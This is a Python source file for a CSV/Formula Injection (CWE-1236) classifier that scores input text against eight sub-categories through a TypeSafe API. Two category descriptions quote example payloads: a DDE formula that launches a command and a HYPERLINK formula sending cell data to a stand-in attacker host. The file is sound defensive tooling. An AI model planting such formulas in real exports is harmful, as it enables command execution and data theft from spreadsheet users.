"""CSV/Formula Injection (CWE-1236) classifier built on the TypeSafe System One API.

Classifies input text against sub-categories drawn from the CWE (Common
Weakness Enumeration) entry for CSV/Formula Injection:
https://cwe.mitre.org/data/definitions/1236.html

CSV/Formula Injection occurs when untrusted data is written into a CSV or
spreadsheet export and later opened in a spreadsheet application (Excel,
Google Sheets, LibreOffice), which interprets cell content beginning with a
formula-trigger character as an executable formula rather than plain text.

Each sub-category is scored independently as a TypeSafe Noul question (does
the input relate to / exhibit this issue?), so a single input can match zero,
one, or several categories at once. All categories are evaluated in one
parallel system_one() call.

Usage:
    python csv_formula_injection_classifier.py "some text to classify"
    python csv_formula_injection_classifier.py --file path/to/content.txt
    echo "some text" | python csv_formula_injection_classifier.py
"""

import argparse
import sys

from typesafe_sdk import Noul, TypeSafeClient

# --- Standard classifier module interface (used by run_all_classifiers.py) ---
CHEATSHEET_NAME = "CSV/Formula Injection (CWE-1236)"
CHEATSHEET_URL = "https://cwe.mitre.org/data/definitions/1236.html"

# Sub-categories drawn from CWE-1236's description of CSV/formula injection
# risks and mitigations. Each description is written so Jev (the TypeSafe
# model) can distinguish it from neighboring categories -- be specific about
# what does and does not count.
CATEGORIES = {
    "unescaped_formula_trigger_characters_in_export": (
        "User-supplied input is written into a CSV or spreadsheet export "
        "without checking whether the field begins with a formula-trigger "
        "character such as `=`, `+`, `-`, `@`, a tab, or a carriage return, "
        "allowing the value to be interpreted as a formula instead of "
        "literal text when the file is opened."
    ),
    "dde_command_execution_payload": (
        "A spreadsheet cell contains a Dynamic Data Exchange (DDE) formula "
        "payload that can trigger command execution when the file is "
        "opened, such as `=cmd|'/c calc'!A1` or a similar DDE-invoking "
        "formula embedded in exported or uploaded data."
    ),
    "hyperlink_based_data_exfiltration_formula": (
        "A spreadsheet cell contains a hyperlink-based formula payload "
        "(e.g. `=HYPERLINK(\"http://attacker.example/?leak=\"&A1,\"link\")`) "
        "designed to exfiltrate the contents of other cells to an "
        "attacker-controlled URL when the victim clicks the link or opens "
        "the file."
    ),
    "missing_formula_neutralization_before_export": (
        "The export/report-generation code path lacks any step to quote, "
        "escape, or prefix (e.g. with a single quote or apostrophe) values "
        "that start with a formula-trigger character before writing them "
        "to the CSV/spreadsheet file, i.e. there is no sanitization or "
        "neutralization logic at all."
    ),
    "untrusted_fields_flowing_into_report_or_export_feature": (
        "A report or export feature (such as invoice generation, audit "
        "logs, or user/contact lists) pulls untrusted user-controlled text "
        "fields -- names, addresses, notes, comments -- directly into a "
        "spreadsheet export without treating them as potentially "
        "attacker-controlled formula content."
    ),
    "csv_reimport_reinterpreting_uploaded_content_as_formulas": (
        "A CSV re-import or bulk-upload feature reads a previously exported "
        "or user-uploaded CSV file and treats its cell values as live "
        "formulas or executable content rather than static/plain data, "
        "propagating a formula-injection payload back into the system."
    ),
    "reliance_on_file_extension_or_mime_type_as_safety_signal": (
        "The application assumes that a `.csv` file extension or a "
        "`text/csv` MIME type inherently means the content is inert plain "
        "text, and skips content-level sanitization on that assumption, "
        "even though spreadsheet applications will still parse formulas in "
        "such files."
    ),
    "spreadsheet_macro_or_external_data_link_injection": (
        "Exported spreadsheet content includes or references an external "
        "data connection, embedded macro, or `WEBSERVICE`/`IMPORTXML`-style "
        "formula function driven by untrusted input, going beyond a plain "
        "formula to fetch remote content or trigger macro execution on "
        "open."
    ),
}


def classify_with_nouls(text: str) -> dict:
    """Return dict of category -> probability (0-1), one Noul per category,
    all evaluated in a single parallel call."""
    with TypeSafeClient() as client:
        result = client.system_one(
            state=text,
            questions={
                name: Noul(instructions=f"Does the input relate to or exhibit this issue: {desc}")
                for name, desc in CATEGORIES.items()
            },
        )
    return {name: answer.noul for name, answer in result.nouls.items()}


def print_table(headers, rows) -> None:
    """Print `rows` (each a tuple of column values) as a simple aligned table."""
    widths = [
        max(len(str(cell)) for cell in (header, *(row[i] for row in rows)))
        for i, header in enumerate(headers)
    ]
    def fmt(row):
        return "  ".join(str(cell).ljust(width) for cell, width in zip(row, widths))

    print(fmt(headers))
    print("  ".join("-" * width for width in widths))
    for row in rows:
        print(fmt(row))


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("text", nargs="?", help="Text to classify")
    parser.add_argument("--file", help="Read text to classify from a file")
    args = parser.parse_args()

    if args.file:
        with open(args.file, "r", encoding="utf-8") as fh:
            text = fh.read()
    elif args.text:
        text = args.text
    else:
        text = sys.stdin.read()

    if not text.strip():
        parser.error("no input text provided")

    scores = classify_with_nouls(text)
    rows = [
        (name, f"{prob:.3f}")
        for name, prob in sorted(scores.items(), key=lambda kv: -kv[1])
    ]
    print_table(("category", "probability"), rows)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
